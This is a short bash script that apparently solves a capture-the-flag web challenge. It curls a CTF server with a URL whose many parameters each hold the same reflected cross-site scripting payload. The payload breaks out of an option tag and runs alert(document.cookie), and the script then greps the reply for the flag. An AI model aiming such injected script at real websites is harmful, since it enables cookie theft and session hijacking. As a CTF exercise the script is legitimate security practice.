#!/bin/bash

# the value null can be modified by creating alert scripts and making a new url with params

# even tho it doesn't work click that link

flag=$(curl 'http://ctf-05.security.cs.pub.ro:8083/?future_club=%3C/option%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Coption%20value=%220%22%3E&future_future=%3C/option%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Coption%20value=%220%22%3E&future_way=%3C/option%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Coption%20value=%220%22%3E&future_SSS=%3C/option%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Coption%20value=%220%22%3E&club_club=%3C/option%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Coption%20value=%220%22%3E&club_future=%3C/option%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Coption%20value=%220%22%3E&club_way=%3C/option%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Coption%20value=%220%22%3E&club_SSS=%3C/option%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Coption%20value=%220%22%3E&you_are_on_your_club=%3C/option%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Coption%20value=%220%22%3E&you_are_on_your_future=%3C/option%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Coption%20value=%220%22%3E&you_are_on_your_way=%3C/option%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Coption%20value=%220%22%3E&you_are_on_your_SSS=%3C/option%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Coption%20value=%220%22%3E' | grep -o SSS{.*})

echo $flag

